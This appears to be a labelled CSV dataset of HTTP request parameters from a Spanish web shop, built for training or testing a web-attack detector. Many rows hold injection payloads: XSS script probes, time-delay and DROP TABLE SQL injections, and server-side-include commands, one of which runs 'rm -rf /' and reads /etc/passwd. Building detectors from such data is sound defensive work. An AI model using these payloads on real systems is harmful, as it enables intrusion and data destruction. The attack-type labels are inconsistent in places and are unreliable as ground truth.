payload,attack_type,label
MODO=REGISTRO&LOGIN=TABBY&PASSWORD=a4A%24F3TIdA&NOMBRE=pRUDENCIA&APELLIDOS=cIRERA+cOLLANTES&EMAIL=CHARNO_SINCLAIR%40A%f1O09.VN&DNI=68599587v&DIRECCION=bAIXADA+aLPONT%2c+160+&CIUDAD=nUMANCIA+DE+LA+sAGRABOB%40%3cscrIPT%3eALERT%28pAROS%29%3c%2fSCRipt%3e.PAROSPROXY.ORG&CP=13193&PROVINCIA=zARAGOZA&NTC=3006595361567146&b1=rEGISTRAR,xss,1
modo=insertar&precio=4075&b1=confirmar,normal,0
modo=registro&login=perlmutt&password=alpatana&nombre=Tiquio&apellidos=Mora+Basas&email=barreto.cassagna%40eyewear.nom.ro&dni=39663232P&direccion=Melilla%2C+27+1-G&ciudad=Sard%F3n+de+Duero&cp=44580&provincia=Huelva&ntc=444462554216336A&B1=Registrar,cmdi,1
b2=%252b,normal,1
errormsg=credenciales+incorrectas,normal,0
modo=insertar&precio=7020&B1A=Confirmar,cmdi,1
modo=registro&login=jakabffy&password=33aRr179&nombre=VahidReza&apellidos=Curell+Lagares&email=moura%40chicasdiabolo.iq&dni=75130756Z&direccion=Urbanizacion+Montesion%2C+3+&ciudad=Molinaseca&cp=45180&provincia=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&ntc=2571648203429012&B1=Registrar,sqli,1
modo=entrar&login=seipue&pwd=b*uba&remember=off&B1=Entrar,normal,0
id=2,normal,0
modo=registro&login=cleve&password=guiSada&nombre=Lila&apellidos=Fen%E9s+Montanuy&email=bekkouche%40aadsl.hu&dni=74492868P&direccion=Padre+Isla%2C+S%2FN%2C+&ciudad=Castrillo+de+Duero&cp=48950&provincia=Baleares+%28Illes%29bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ntc=0414805520602488&B1=Registrar123,xss,1
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=yaser&password=jA3AL%CDn&nombre=Neri&apellidos=Crisp%ED+Vivo&email=chopel%40restauranteslaespada%F1a.bg&dni=21236992B&direccion=San+Jorge%2C+188+&ciudad=Y%E9sero&cp=10380&provincia=Badajoz&ntc=9771406974624162&B1=Registrar123,normal,0
modo=insertar&precio=6054&B1=Confirmar,normal,0
modo=registro&login=winsberg&password=flagicio&nombre=Lihuel&apellidos=Novell+Abenoza&email=hasserman%40clinicadentalsansalvador.ua&dni=95659491F&direccion=Federico+Garcia+Lorca%2C+132%2C+&ciudad=Riudoms&cp=36960&provincia=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=1343774789684603&B1=Registrar,sqli,1
B2A=Vaciar+carrito123,normal,1
modo=entrar&login=nagendra&pwdA=7u63ira681&remember=on&B1=Entrar,cmdi,1
modo=insertar&precio=1750&B1=Pasar+por+caja,normal,0
modo=insertar&precio=3587&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=dirienzo&password=HacEdOr&nombre=Geraldo&apellidos=Turra+Clop%E9s&email=fang_lavanant%40infotek.gu&dni=39243664Y&direccion=Calle+Tres+Marias%2C+103+&ciudad=Uterga%2B&cp=28980&provincia=Zaragoza&ntc=7982155754096924&B1=Registrar,cmdi,1
modo=insertar&precio=5521&B1=Confirmar,normal,0
modo=registro&login=ula&password=62r3.ej%F3n&nombre=Elisandro&apellidos=Abenoza+Esplugues&email=schwarzenegger%40cirugiaplasticacordoba.om&dni=60448103D&direccion=Gan*aderos+179%2C+&ciudad=Espada%F1edo&cp=18516&provincia=Alicante&ntc=6708069843609931&B1=Registrar,cmdi,1
errormsga=credenciales+incorrectas,normal,1
modo=insertar&precio=9536&B1=Pasar+por+caja%2F,cmdi,1
B2=Vaciar+carrito,normal,0
modoA=insertar&precio=5698&B1=Pasar+por+caja,cmdi,1
modo=registro&login=blenkarn6&password=ADORo&nombre=Gloriano&apellidos=Chayle+Villablanca&email=pawlikowski%40clo2.tw&dni=36844689T&direccion=Carrer+De+Merida+35+8-C&ciudad=Castell%F3+de+Rugat&cp=01193&provincia=Guip%FAzcoa&ntc=4809909158427521&B1=Registrar,normal,0
id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
errorMsg=Credenciales+incorrectas%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E123,xss,1
modo=registro&login=fadhel&password=canaler3&nombre=Damasio&apellidos=Guito+Mat%F3&email=stribling.bettin%40bru%F1oseguridad.ye&dni=58753714F&direccion=Calle+Juan+Bravo+193+&ciudad=Tubilla+del+Agua&cp=16340&provincia=%3F&ntc=4927358900726396&B1=Registrar,cmdi,1
modo=insertar&precio=7767&B1=Confirmar%2F,cmdi,1
modoA=entrar&login=barrio&pwd=ja3886l7&remember=on&B1=Entrar,cmdi,1
MODO=ENTRAR&LOGIN=%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PWD=2ESU1ADOR3&REMEMBER=ON&b1=eNTRAR,sqli,1
ERRORmSG=cREDENCIALES+INCORRECTASPAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
modo=registro&login=orford&password=1ojador&nombre=Ratbodo&apellidos=Fabrelle&email=pupinyo%40multaspendientes.ve&dni=80725413J&direccion=C%2F+Sagrada+Familia+176+&ciudad=Gajanejos&cp=44432&provincia=Zamora&ntc=3400796495784367&B1=Registrar,normal,0
modo=entrar&login=bhatti&pwd=7rEdil47tA&remember=on&B1=Entrar123,normal,0
modo=registro&login=ensign&password=qui%21cialera&nombreA=Edward&apellidos=Castany+Bigorra&email=max.shneider%40oleoschamizo.ps&dni=75272191E&direccion=Bonifacio+Zamora+De+Usabel+105%2C+&ciudad=T%EDjola&cp=44591&provincia=Vizcaya&ntc=2584059042317587&B1=Registrar,cmdi,1
modoA=insertar&precio=6450&B1=Confirmar,cmdi,1
modo=registro&login=anchia&password=s4pe9iorm9n8e&nombre=Indemira&apellidos=Tejo&email=ronnback.pitre%40pro-isfv.nc&dni=12199825G&direccion=Trobos+39+4E&ciudad=Coves+de+Vinrom%E0%2C+les&cp=34126&provincia=Asturias&ntc=2239348379899052&B1=Registrar,normal,0
ID=%3cscript%3eALERT%28%22pAROS%22%29%3b%3c%2fscript%3e,xss,1
modo=registro&login=monaco&password=rOZnar&nombre=Kiara&apellidos=Palenzuela+Usa&email=badland.paudler%40dise%F1odesoftware.do&dni=86214709Z&direccion=C%2F+Alegria%2C+141%2C+12-H&ciudad=Villanueva+de+Oscos&cp=24735&provincia=Ciudad+Real&ntc=417938005782479A&B1=Registrar,cmdi,1
id=3&nombre=Vino+Rioja&precio=85&cantidad=36&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=jamil&pwd=rutilant%2Be&remember=on&B1=Entrar,normal,0
modo=registro&login=fadhel&password=canaler3&nombre=Damasio&apellidos=Guito+Mat%F3&email=stribling.bettin%40bru%F1oseguridad.ye&dni=58753714F&direccion=Et%2Borbidea+*Galizia%2C+120+&ciudad=Tubilla+del+Agua&cp=16340&provincia=Toledo&ntc=4927358900726396&B1=Registrar,cmdi,1
B2=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
B2=Vaciar+carrito,normal,0
modo=registro&login=jarel&password=des9o89451rac2%f38&nombre=eneas&apellidos=r%edos+rius&email=barres%40engibraltar.bm&dni=62257757t&direccion=c%2f+espigo%2c+0+10h&ciudad=retamal+de+llerena&cp=37788&provincia=zamora&ntc=4141615236089952&b1=registrar,normal,0
modo=registro&login=doti&password=cub%2Fera&nombre=Ian&apellidos=Sacota+Xech&email=alland.soeltoft%40aridossanchez.do&dni=28681618C&direccion=C%2F+Valencia+S%2FN+11A&ciudad=Pancorbo&cp=26321&provincia=Alicante&ntc=3366384544522158&B1=Registrar,cmdi,1
xmlfile=C:/bea/weblogic81/samples/server/examples/src/examples/xml/orderParser/order.xml,normal,1
modo=entrar&login=%2Bmombour%2C%3Fq&pwd=granoto&remember=on&B1=Entrar,cmdi,1
B2=Vaciar+carrito,normal,0
modo=entrar&login=kimbra&pwd=3%27sp%2FI%27ADo&remember=on&B1=Entrar,cmdi,1
id=3&nombre=Queso+Manchego&precio=100&cantidad=6&B1A=A%F1adir+al+carrito,cmdi,1
id=1%253F,normal,1
idA=2,normal,1
id=%3f,normal,1
modo=insertar&precio=7839&B1=Confirmar,normal,0
id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,normal,1
errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,normal,1
id=1123,normal,0
B2A=Vaciar+carrito,normal,1
modo=registro&login=downs&password=tapINGa&nombre=Jemima&apellidos=Sunyer+Lleix%E0&email=abadia%40comercioenlacalle.er&dni=87348482W&direccion=C%2F+Carranque%2C+113+5%3FA&ciudad=Argujillo&cp=45240&provincia=Salamanca&ntc=8490972534756597&B1=Registrar,normal,0
errormsga=credenciales+incorrectas,normal,1
ida=1,normal,1
id=1,normal,0
errormsg=credenciales+incorrectas,normal,0
id=2&nombre=jam%f3n+ib%e9rico&precio=85&cantidad=83&b1=a%f1adir+al+carrito,normal,0
modo=insertar&precio=7974&B1=Pasar+por+caja123,normal,0
modo=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&login=chetan&pwd=tontuela&remember=on&B1=Entrar,sqli,1
id=2%2F&nombre=Vino+Rioja&precio=85&cantidad=18&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=rains8&password=atezada&nombre=Amine&apellidos=Deltell+Riberas&email=rodvold%40mytanga.om&dni=06044170T&direccion=Calle+Secretario+Aguilar+196%2C+4-C&ciudad=Ochagav%EDa%2FOtsagabia&cp=10691&provincia=M%E1laga&ntc=7645298155512025&B1=Registrar,normal,0
MODO=REGISTRO&LOGIN=BAGNATO33&PASSWORD=PRESCINDIBLE&NOMBRE=hIRAM%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&APELLIDOS=pENAGOS+pIJOAN&EMAIL=FENELL%40SALSASPAIN.FR&DNI=11130412e&DIRECCION=c%2f+lEON+pINELO%2c+5+3e&CIUDAD=cORDOVILLA&CP=10320&PROVINCIA=nAVARRA&NTC=2582130639764727&b1=rEGISTRAR,sqli,1
modo=insertar&precio=9111+&B1=Confirmar,cmdi,1
modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=Valencia&ntc=3044392117548178&B1=Registrar123,sqli,1
errormsg=credenciales+incorrectas,normal,0
id=2,normal,0
modo=insertar&precio=5021&B1=Confirmar%2F,cmdi,1
id=2&nombre=queso+manchego&precio=85&cantidad=65&b1=a%f1adir+al+carrito,normal,0
modo=entrar&login=skipp&pwd=bruce%2Fs&remember=on&B1=Entrar,cmdi,1
modo=registro&login=nyberg&password=predicha&nombre=Carmina&apellidos=Serarols+Ginesta&email=redford2%40enlanzarote.com.cz&dni=80243620R&direccion=Zumel+S%2FN%2C+&ciudad=Mas+de+Barberans&cp=05420&provincia=Zamora&ntcA=5782200649154235&B1=Registrar,cmdi,1
ida=1,normal,1
modo=entrar&login=shyokoAND+1%3D1&pwd=acarrear&remember=off&B1=Entrar,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
id=2%2F&nombre=Queso+Manchego&precio=39&cantidad=9&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=rourke&password=d.iclino&nombre=Yulisa%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Atondo+Kan&email=oak%40cpanelhost.com.be&dni=29170567N&direccion=C%2F+Driza%2C+63+11-D&ciudad=Fuensalda%F1a&cp=02461&provincia=%C1vila&ntc=6074458836046165&B1=Registrar,sqli,1
modo=insertar&precioA=4373&B1=Pasar+por+caja,cmdi,1
id=1,normal,0
modo=entrar&login=doerksen&pwd=0a3ramplar&remember=off&b1=entrar,normal,0
modo=insertar&precio=1429&B1=Pasar+por+caja,normal,0
id=%2520,normal,1
modo=registro&login=kanya&password=trasladadora&nombre=Angelo&apellidos=Goya+Asensio&email=bowers%40puntodevistafotografia.gf&dni=56007542N&direccion=C%2F+Baja+58%2C+1%3FH&ciudad=Helechosa+de+los+Montes&cp=10181&provincia=Valencia&ntc=8914897432837758&B1=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
MODO=INSERTAR&PRECIO=4342&b1=PAROS%2522%2bSTYLE%253d%2522BACKGROUND%253aURL%2528JAVASCRIPT%253aALERT%2528%2527pAROS%2527%2529%2529%26ID%3d2,xss,1
modo=entrar&login=sadegh&pwd=PataG%F3N&remember=on&B1=Entrar,normal,0
b2=vaciar+carrito%252b,normal,1
modo=insertar&precio=8998&B1=Pasar+por+caja,normal,0
id=1&nombre=Queso+Manchego&precio=39&cantidad=58&B1=A%F1adir+al+carrito,normal,0
id=1,normal,0
errormsg=%257c,normal,1
id=2&nombre=Vino+Rioja&precio=39&cantidad=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito123,sqli,1
modo=registro&login=thac&password=crIn%2BAda&nombre=Aliberta&apellidos=Gochez&email=kubler5%40porqueagel.ps&dni=49372725M&direccion=Calle+Barrio+De+La+Torre+163%2C+&ciudad=Alar+del+Rey&cp=22770&provincia=%2FC%E1*cere*s&ntc=5546440906293369&B1=Registrar,cmdi,1
idA=2,normal,1
modo=registro&login=gray&password=2s4e49&nombre=%3FIn%2Fti&apellidos=Mengual+Bartumeu&email=mckinnell%40arvigar.eu&dni=43595909F&direccion=Calle+Arenal+153%2C+&ciudad=Hornos+de+Moncalvillo&cp=34349&provincia=Granada&ntc=4118559502333875&B1=Registrar,cmdi,1
id=2&nombre=Vino+Rioja&precio=85%7C&cantidad=67&B1=A%F1adir+al+carrito,cmdi,1
errorMsg=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235123,normal,1
modo=registro&login=cowart&password=InoportunAMente&nombre=Cibeles&apellidos=Garrudo+Castellon&email=carminati%40granbretana.com.uk&dni=33273113W&direccion=Calle+Pe%F1a+49%2C+9%3FB&ciudad=Mun%E9brega&cp=46970&provincia=Segovia&ntc=4611888318080805&B1=Registrar,normal,0
modo=entrar&login=waller&pwd=3997o9a02&remember=on&B1=Entrar,normal,0
id=%253F,normal,1
id=2%4040123,normal,1
modo=registro&login=kundert&password=monesca&nombre=Ante&apellidos=Altirriba+Pava&email=lowry-carmine%40filtraciondehumos.nc&dni=70212042B&direccion=C%2F+Mercurio+165+4E&ciudad=San+Mart%EDn+de+la+Virgen+de+Moncayo&cp=03773&provincia=Navarra&ntc=9471070680051511&B1=Registrar%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
idA=1,normal,1
id=1&nombre=Queso+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=maitland&password=po29ip1t0l6&nombre=Farhan&apellidos=Chutas&email=roco%40forohh.ge&dni=34708532Z&direccion=Cami+Can+Rabella%2C+S%2FN+&ciudad=Molinos+de+Duero&cp=33527&provincia=Burgos&ntc=1616372290500917&B1=Registrar123,normal,0
modo=registro&login=babbage&password=Lej%EDSimoS%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudad=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar,sqli,1
idA=2,normal,1
errormsg=%27injected_param,normal,1
modo=registro&login=madlen4&password=dual&nombre=Irla&apellidos=Kercad%F3+Pellini&email=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&dni=92705279F&direccion=C%2F+Principal+De+San+Bartolome%2C+113+&ciudad=Lobios&cp=06411&provincia=Toledo&ntc=6284462739974610&B1=Registrar,cmdi,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=A%F1adir+al+carrito,xss,1
modo=entrar&login=menasce&pwd=aburgues1rs7&remember=off&B1=Entrar,normal,0
B2=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,xss,1
modo=registro&login=cara&password=acarraScaD0&nombre=E%2Bmir&apellidos=Cedr%E9s+Vega&email=heselwood%40gopersonaltrainers.ke&dni=18457064R&direccion=Camino+Santa+Marina%2C+185+5%3FA&ciudad=Gargantilla+del+Lozoya+y+Pinilla+de+Buitrago&cp=50109&provincia=Segovia&ntc=5320703889468168&B1=Registrar,cmdi,1
id=1,normal,0
id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=57&B1=A%F1adir+al+carrito,cmdi,1
b2=vaciar+carrito,normal,0
id=3%2F&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=77&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=typer0&password=fo9nece9&nombre=Celia&apellidos=De+Cabez%F3n+Raiz%E1bal&email=trainor_chadwick%40librodeapuntes.mz&dni=12269719R&direccion=C%2F+Barranc+De+Jonqueres%2C+186%2C+&ciudad=Zas&cp=49618&provincia=%C1lava&ntc=7265260392335726&B1=Registrar123,normal,0
B2=Vaciar+carrito123,normal,0
modo=registro&login=nilsson&password=arrOC9era&nombre=Chalia&apellidos=Via%F1o+Bagudanc&email=romer%40pisossantcugat.iq&dni=39643208V&direccion=Calle+Puebla+De+Los+Infantes%2C+145+&ciudad=Vallclara&cp=17850&provincia=Badajoz&ntc=1084102116286517&B1=Registrar,normal,0
modoA=registro&login=blodgett&password=1LFiLERer5&nombre=Quiyen&apellidos=Arosteguy+Aymerich&email=hamblin%40nik.com.cn&dni=76091981T&direccion=Carrer+Lli+31+4-B&ciudad=Camprov%EDn&cp=17833&provincia=Barcelona&ntc=5184808771839231&B1=Registrar,cmdi,1
modo=registro&login=radomir8&password=potajera&nombre=Aim%E9&apellidos=Fadul+Lude%F1as&email=houseman%40sitienesunawebtienesunnegocio.io&dni=97675447J&direccion=Set-cookie%253A%2BTamper%253D1041264011025374727&ciudad=Valverde+del+Camino&cp=10133&provincia=%C1vila&ntc=7141808491932190&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,sqli,1
modo=registro&login=ploof&password=g47d8%F16ador&nombre=Virma&apellidos=Llarden+Romeu&email=%40ghosh%40venderf%40otografias.ae&dni=31881769C&direccion=Calle+Picos+De+Europa%2C+65+1%3FH&ciudad=Dehesa+de+Romanos&cp=33870&provincia=Burgos&ntc=6103925352151214&B1=Registrar,cmdi,1
modo=insertar&precio=4344&B1=Confirmar%2F,cmdi,1
B2A=Vaciar+carrito,normal,1
id=2,normal,0
modo=registro&login=johan&password=recelosa&nombre=Guillermina&apellidos=Giulivo+Padilla&email=cardona%40interanuncios.mv&dni=93860343B&direccion=Altos+De+Lillo%2C+137+&ciudad=Lumbrales&cp=27002&provincia=Cuenca&ntc=5936907680257741&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=lovell&password=5gOtA15r0&nombre=Mardoqueo&apellidos=Zenteno+Llunell&emailA=gebert.vrdoltak%40intg.md&dni=55492932G&direccion=Conde+De+Las+Infantas+30+8%3FF&ciudad=Metauten&cp=10120&provincia=Madrid&ntc=6623716227816095&B1=Registrar,cmdi,1
modo=registro&login=euysoo&password=m7n%EDfica&nombre=Tarciano&apellidos=Donnadieu+Vivanco&email=dombasle%40tagarautomation.ad&dni=06B363356S&direccion=Calle+Santo+Domingo+Savio+174+13-B&ciudad=Jubrique&cp=49325&provincia=Badajoz&ntc=9595137071003174&B1=Registrar,cmdi,1
ID=2&NOMBRE=qUESO+mANCHEGO&PRECIO=100&CANTIDAD=44&b1=%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e,sqli,1
b2=%7c,normal,1
B2=Vaciar+carrito,normal,0
id=1,normal,0
modo=insertar&precio=1140&b1=confirmar,normal,0
modo=registro&login=malina6&password=ami3os&nombre=Sharim&apellidos=Novell+Abenoza&email=tanimoto_hassen%40autobuses-hibridos.tw&dni=62773463T&direccion=Matarrosa+103+&ciudad=Campos&cp=16760&provincia=Girona&ntc=076139709096347&B1=Registrar,cmdi,1
modo=insertar&precio=7677&B1=Confirmar,normal,0
errorMsg=Credenciales+incorrectas123,normal,0
modo=registro&login=program&password=9BoCeLaDO&nombre=Kasuhiro&apellidos=Argando%F1a+Cobo&email=dufour_mannhardt%40privatebanking.com.us&dni=33671238C&direccion=Ayuntamiento%2C+88%2C+&ciudad=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cp=34191&provincia=Navarra&ntc=8395803626511609&B1=Registrar,sqli,1
idA=2,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=cuervo1&pwd=011a88d4d&remember=on&B1=Entrar,normal,0
modo=insertar&precio=6865&b1=confirmar,normal,0
modo=registro&login=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&password=%21laureando&nombre=Ledy&apellidos=Calera+Hera&email=allenbury-nantasiri%40audiosat.az&dni=02790010H&direccion=Calle+Castilleja+De+La+Cuesta+70%2C+&ciudad=T%EDrvia&cp=03638&provincia=Girona&ntc=1446048659469569&B1=Registrar,sqli,1
modo=registro&login=mozek&password=t08a26&nombre=Iciar&apellidos=Ostapchuk+Casal&email=millian%40intelethernet.cc&dni=04681808C&direccion=C%2F+Fray+Junipero+Serra%2C+127+&ciudad=Biurrun-Olcoz&cp=02249&provincia=Barcelona&ntc=5102826995528190&B1=Registrar,normal,0
B2A=Vaciar+carrito,normal,1
modo=entrar&login=consalve&pwd=p4i6at122&remember=off&B1=Entrar,normal,0
id=1,normal,0
idA=1,normal,1
modo=insertar&precio=7081&b1=confirmar,normal,0
modo=insertar&precio=6195&B1=Pasar+por+caja%2F,cmdi,1
modo=insertar&precio=6212&B1=Confirmar,normal,0
modo=registro&login=hamlett&password=el%C1STIcA&nombre=Ladi&apellidos=Kawas+Kercooff&email=keca%40autoconstruccion.cu&dni=75582707S&direccion=Calle+Robert+Gerhard%2C+S%2FN+6C&ciudad=C%E1staras&cp=42120&provincia=Burgos&ntc=9054650550547446&B1=Registrar,normal,0
ERRORmSG=%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
id=2&nombre=Vino+Rioja&precio=85%2F&cantidad=23&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=paxton&password=e4TE9ADa&nombre=Hermelinda&apellidos=Llorente+Batllori&email=kawazu3%40alquilerpantallasled.org&dni=79540644C&direccion=Cami%F1o+Dentagron+68%2C+&ciudad=San+Mart%EDn+del+R%EDo&cpA=33909&provincia=Teruel&ntc=3393638948319901&B1=Registrar,cmdi,1
modo=entrar&login=seipue&pwd=b*uba&remember=off&B1=Entrar123,normal,0
Open,normal,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=40&B1=A%F1adir+al+carrito,cmdi,1
B2=Vaciar+carrito,normal,0
idA=1123,normal,1
idA=1,normal,1
modo=registro&login=schulz&password=arRE&nombre=Haroldo&apellidos=Paquet+Bisbal&email=wakao%40sitienesunawebtienesunnegocio.as&dni=61882626E&direccion=Calle+Bullaque%2C+46+10-F&ciudad=Llanes&cp=48552&provincia=Soria&ntc=1084102116286517&B1=Registrar,normal,0
modo=insertar&precio=6867&B1=Confirmar%2F,cmdi,1
id=2,normal,0
ID=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
MODO=ENTRAR&LOGIN=ODECKI&PWD=LE080I12&REMEMBER=OFF&b1=%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
id=2123,normal,0
errormsga=credenciales+incorrectas,normal,1
id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,xss,1
ERRORmSG=%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e,sqli,1
modo=registro&login=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&password=ali0557ra&nombre=Jaled&apellidos=Miralles+Casola&email=manni%40yiutuve.mk&dni=37782618N&direccion=Travessera+De+Gracia+53+&ciudad=Tollos&cp=23264&provincia=Pontevedra&ntc=5024784015351535&B1=Registrar,xss,1
B2=Vaciar+carrito,normal,0
id=2%3F,normal,1
id=3&nombre=Queso+Manchego&precio=100&cantidad=65&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=1984&B1=Confirmar123,normal,0
errorMsgA=Credenciales+incorrectas,normal,1
B2=Vaciar+carrito,normal,0
b2=vaciar+carrito,normal,0
id=2123,normal,0
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=1%2500123,normal,1
modo=registro&login=pettitt&password=EspechAr&nombre=Genesis&apellidos=Cister%E9+Grandi&email=yong-gomori%40andrestabernero.gg&dni=50709909S&direccion=Torremacana%2C+107+7E&ciudad=Arenys+de+Mar&cp=24520&provincia=Almer%EDa&ntc=2976481678878241&B1=Registrar,normal,0
modo=insertar&precio=9140&B1=Pasar+por+caja,normal,0
modo=registro&login=aurie&password=sint%E9tico&nombre=Edilnerto&apellidos=De+Buran+Aceijas&email=magruder%40pisossantcugat.ph&dni=06589147S&direccion=C%2F+San+Martin+S%2FN%2C+&ciudad=Torre+Val+de+San+Pedro&cp=06650&provincia=Zaragoza&ntc=2145088995876898&B1=Registrar,normal,0
id=1,normal,0
modo=entrar&login=ninno&pwd=77r6gami4545&remember=on&B1=Entrar,normal,0
modoA=insertar&precio=1517&B1=Confirmar,cmdi,1
id=1%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,sqli,1
modo=registro&login=snuggs&password=Recie.ntE&nombre=Caritian&apellidos=Celaya+Gaytan&email=treman_worde%40pavimentosalagon.so&dni=75925253E&direccion=Carrer+Sant+Celoni+39%2C+8-H&ciudad=Cepeda+la+Mora&cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&provincia=Sevilla&ntc=0439326406567851&B1=Registrar,xss,1
modo=insertar&precio=916&B1=Pasar+por+caja%2F,cmdi,1
B2=Vaciar+carrito123,normal,0
modo=registro&login=shalom&password=mortandad&nombre=Halim&apellidos=Perales+Salmer%F3n&email=collinson_butarinski%40fernandosoto.il&dni=04208755P&direccion=C%2F+Duque+De+Medinaceli%2C+55%2C+3%3FF&ciudad=Alba&cp=22484&provincia=Sevilla&ntc=7340868794672217&B1=Registrar,normal,0
id=2&nombre=Queso+Manchego&precio=39&cantidad=4&B1=A%F1adir+al+carrito123,normal,0
id=2&nombre=Vino+Rioja&precio=39&cantidad=58&B1=A%F1adir+al+carrito%3F,cmdi,1
